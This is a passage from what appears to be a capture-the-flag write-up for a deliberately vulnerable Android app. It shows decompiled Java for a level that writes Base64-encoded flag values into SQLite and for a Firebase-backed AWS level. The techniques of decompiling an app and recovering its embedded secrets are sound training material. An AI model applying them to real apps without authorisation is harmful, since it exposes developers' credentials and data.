        &lt;span style=&#34;color:#8be9fd&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;[]&lt;/span&gt; bArr2 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;y&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;        &lt;span style=&#34;color:#6272a4&#34;&gt;//f1ag-pa55
&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;        d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;bArr2&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;decodedDirectoryTwo&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        Charset charset2 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; StandardCharsets&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;UTF_8&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
        d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;charset2&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;StandardCharsets.UTF_8&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;A&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; String&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;bArr2&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; charset2&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        f b2 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
        d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;b2&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;FirebaseDatabase.getInstance()&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        d d2 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; b2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
        d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;d2&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;FirebaseDatabase.getInstance().reference&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; d2&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
        d h &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; d2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;z&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;h&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;database.child(refDirectory)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;C&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; h&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
        d h2 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;B&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;A&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;h2&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;database.child(refDirectoryTwo)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;D&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; h2&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;on looking at the oncreate method define in the flag7 activity.from the code below , we are creating a database called Thisislatest.db&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;Bundle bundle&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;super&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;onCreate&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;bundle&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    setContentView&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;layout&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;activity_flag_seven_sqlite&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    C&lt;span style=&#34;color:#ff79c6&#34;&gt;((&lt;/span&gt;Toolbar&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;toolbar&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;));&lt;/span&gt;
    j&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;g&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;a&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    H&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;((&lt;/span&gt;FloatingActionButton&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; findViewById&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;R&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;fab&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;)).&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;setOnClickListener&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; a&lt;span style=&#34;color:#ff79c6&#34;&gt;());&lt;/span&gt;
    SQLiteDatabase writableDatabase &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;u&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;getWritableDatabase&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
    ContentValues contentValues &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;new&lt;/span&gt; ContentValues&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
    contentValues&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;put&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; Base64&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;decode&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;VGhlIGZsYWcgaGFzaCE=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#ff79c6&#34;&gt;));&lt;/span&gt;
    contentValues&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;put&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;subtitle&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; Base64&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;decode&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;MmFiOTYzOTBjN2RiZTM0MzlkZTc0ZDBjOWIwYjE3Njc=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#ff79c6&#34;&gt;));&lt;/span&gt;
    writableDatabase&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;insert&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Thisisatest&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; contentValues&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    contentValues&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;put&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; Base64&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;decode&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;VGhlIGZsYWcgaXMgYWxzbyBhIHBhc3N3b3JkIQ==&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#ff79c6&#34;&gt;));&lt;/span&gt;
    contentValues&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;put&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;subtitle&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; h&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;());&lt;/span&gt;
    writableDatabase&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;insert&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Thisisatest&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; contentValues&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
&lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;flag8---aws-storage-and-security&#34;&gt;FLag8 - AWS Storage and Security.&lt;/h3&gt;
&lt;p&gt;This level is about learing AWS storage and security.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;FlagEightLoginActivity&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
    f b2 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
    d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;b2&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;FirebaseDatabase.getInstance()&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    d d2 &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; b2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;();&lt;/span&gt;
    d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;d2&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;FirebaseDatabase.getInstance().reference&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;u&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; d2&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
    d h &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; d2&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;h&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;/aws&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    d&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;m&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;h&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;database.child(\&amp;#34;/aws\&amp;#34;)&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;v&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; h&lt;span style=&#34;color:#ff79c6&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color:#ff79c6&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;clicking on the  onclick method in the source code., as shown in the code snippet below.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#8be9fd&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;onClick&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;View view&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;FlagEightLoginActivity&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;this&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;H&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;()&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;==&lt;/span&gt; 0&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;view &lt;span style=&#34;color:#ff79c6&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;null&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;{&lt;/span&gt;
            Snackbar X &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; Snackbar&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#50fa7b&#34;&gt;X&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;(&lt;/span&gt;view&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;AWS CLI.&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;,&lt;/span&gt; 0&lt;span style=&#34;color:#ff79c6&#34;&gt;);&lt;/span&gt;
